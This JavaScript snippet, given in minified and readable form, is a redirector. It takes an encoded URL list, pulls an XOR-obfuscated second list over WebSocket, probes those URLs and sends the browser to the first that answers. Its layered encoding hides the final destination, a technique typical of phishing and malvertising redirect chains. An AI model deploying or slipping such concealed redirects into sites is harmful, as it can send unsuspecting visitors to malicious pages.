(function a(b,c=console.error,d=8e3,e=!1){const f=new AbortController,g=setTimeout(a=>f.abort(a),d,"timeout");Promise.any(b.split(",").map(a=>e?fetch(a,{cache:"no-cache",signal:f.signal}).then(async a=>(await a.blob(),a.url)):new Promise((b,c)=>{const d=new WebSocket(a);f.signal.addEventListener("abort",a=>d.close(1e3,a.reason)),d.onmessage=a=>b(a.data),d.onerror=d.onclose=c}))).finally(()=>{clearTimeout(g),f.abort("finish")}).then(e?a=>location.assign(a):b=>{const e=Uint8Array.from(b.match(/.{2}/g),a=>parseInt(a,16)),f=e.slice(0,8);a(String.fromCodePoint(...e.slice(8).map((a,b)=>f[b%8]^(f[b%8]=a))),c,d,!0)},c)})(atob("{BASE64URLS}"),()=>location.assign("{ERRORPAGE}"));

(function go(urls, error = console.error, timeout = 8000, redirect = false)
{
	const
	controller = new AbortController,
	timer = setTimeout(reason => controller.abort(reason), timeout, 'timeout');
	Promise.any(urls.split(',').map(url => redirect
	? fetch(url, {cache: 'no-cache', signal: controller.signal}).then(async response => (await response.blob(), response.url))
	: new Promise((resolve, reject) =>
	{
		const websocket = new WebSocket(url);
		controller.signal.addEventListener('abort', event => websocket.close(1000, event.reason));
		websocket.onmessage = event => resolve(event.data);
		websocket.onerror = websocket.onclose = reject;
	}))).finally(() =>
	{
		clearTimeout(timer);
		controller.abort('finish');
	}).then(redirect ? url => location.assign(url) : data =>
	{
		const byte = Uint8Array.from(data.match(/.{2}/g), (hex)=> parseInt(hex, 16)), key = byte.slice(0, 8);
		go(String.fromCodePoint(...byte.slice(8).map((v, i) => key[i % 8] ^ (key[i % 8] = v))), error, timeout, true);
	}, error);
}(atob(''),
() => location.assign('')))